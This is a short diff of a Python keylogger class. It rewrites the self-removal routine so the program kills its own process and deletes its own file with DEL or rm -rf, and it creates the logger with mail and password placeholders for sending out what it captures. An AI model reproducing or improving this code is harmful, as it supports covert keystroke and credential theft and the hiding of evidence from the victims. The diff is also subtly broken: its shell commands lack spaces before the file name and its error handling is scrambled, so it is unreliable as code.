@@ -99,21 +99,20 @@ class KeyLogger:
             try:
                 pwd = os.path.abspath(os.getcwd())
                 os.system("cd " + pwd)
-                os.rename('keylogger.py', 'keylogger.bat')
-                os.rename('keylogger.bat', 'keylogger.py')
+                os.system("taskkill /F /IM" + __file__ + "/T")
             except OSError:
                 print('File is still open.')
-                os.system("DEL keylogger.py")
+                os.system("DEL" + __file__)
 
         else:
             try:
                 pwd = os.path.abspath(os.getcwd())
                 os.system("cd " + pwd)
-                os.rename('keylogger.py', 'keylogger.bat')
-                os.rename('keylogger.bat', 'keylogger.py')
-            except OSError:
+                os.system('pkill leafpad')
                 print('File is still open.')
-                os.system("rm -rf keylogger.py")
+                os.system("rm -rf" + __file__ )
+            except OSError:
+                print('File is close.')
 
 
 keylogger = KeyLogger(10, 'MAIL', 'PASSWORD')
